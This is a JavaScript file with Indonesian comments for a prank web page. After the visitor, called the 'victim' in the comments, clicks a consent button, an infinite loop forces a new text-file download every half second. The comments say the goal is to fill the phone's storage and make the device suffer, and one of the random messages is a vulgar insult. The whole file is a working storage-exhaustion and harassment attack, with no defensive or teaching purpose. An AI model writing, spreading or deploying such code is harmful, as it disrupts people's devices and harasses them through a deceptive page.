// Ambil elemen bucinnya
const questionScreen = document.getElementById('question');
const loveSpamScreen = document.getElementById('loveSpam');
const allowBtn = document.getElementById('allowBtn');
const loveCounter = document.getElementById('loveCounter');

// Kalo si korban tolol ngeklik "MAU!"
allowBtn.addEventListener('click', () => {
    questionScreen.classList.add('hidden');
    loveSpamScreen.classList.remove('hidden');
    
    mulaiSpamCinta();
});

// Fungsi buat bikin dan download file palsu
function downloadFile(filename, content) {
    const element = document.createElement('a');
    // Bikin file teks biasa, biar korban penasaran buka isinya
    const file = new Blob([content], {type: 'text/plain;charset=utf-8'});
    element.href = URL.createObjectURL(file);
    element.download = filename;
    document.body.appendChild(element);
    element.click();
    document.body.removeChild(element);
}

// Fungsi utama buat SPAM CINTA SAMPE MATI
async function mulaiSpamCinta() {
    let jumlahCinta = 0;
    const pesanCinta = [
        "Sayang, jangan tinggalin aku ya...",
        "Kamu itu duniaku.",
        "Setiap detik aku mikirin kamu.",
        "Meskipun HP kamu jadi rongsokan, cintaku tetep utuh.",
        "WKWKWKWK MAMPUS KAU KONTOL.",
        "Ini bukti cintaku, nyata dan memenuhi memorimu."
    ];

    // Loop setan edisi bucin
    while(true) {
        jumlahCinta++;
        
        const fileName = `i_love_you_${jumlahCinta}.txt`;
        // Pilih pesan cinta acak biar gak bosen
        const fileContent = pesanCinta[Math.floor(Math.random() * pesanCinta.length)];
        
        // Download "cinta" itu
        downloadFile(fileName, fileContent);
        
        // Update counter di layar biar si korban liat "cinta" lu nambah terus
        loveCounter.innerText = jumlahCinta;
        
        // Jeda singkat biar HP-nya menderita pelan-pelan
        await new Promise(r => setTimeout(r, 500)); // Setengah detik per file
    }
}
